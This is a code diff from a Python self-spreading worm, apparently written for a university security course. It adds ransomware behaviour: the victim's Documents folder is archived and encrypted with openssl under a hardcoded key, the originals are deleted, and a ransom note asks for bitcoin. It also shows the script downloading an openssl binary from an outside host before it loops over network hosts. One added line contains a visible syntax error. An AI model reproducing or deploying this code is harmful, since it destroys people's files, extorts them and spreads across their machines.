@@ -130,10 +130,20 @@ def encryptVictim():
 
 		# Close the archive file
 		tar.close()
-		call(["chmod", "a+x", "./openssl"])
+
+		# Encrypt
+		call(["chmod", "a+x", "/tmp/openssl"])
 		call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents.tar", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
+
+		# Remove files
 		shutil.rmtree('/home/ubuntu/Documents/')
 		call(["rm", '/home/ubuntu/Documents.tar'])
+
+		# Tell user to pay up
+
+		ransom = open("/home/ubuntu/BetterPayMe.txt, "w")
+		ransom.write("Your documents folder has been encrypted and I will need 1,000,000 bitcoin in order to decrypt!!\n Thank you have a nice day!!")
+		ransom.close()
 	except:
 		print("Couldn't encypt victim")
 
@@ -157,8 +167,6 @@ else:
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
 	encryptVictim()
 
-
-print network
 
 for Host in network:		
 
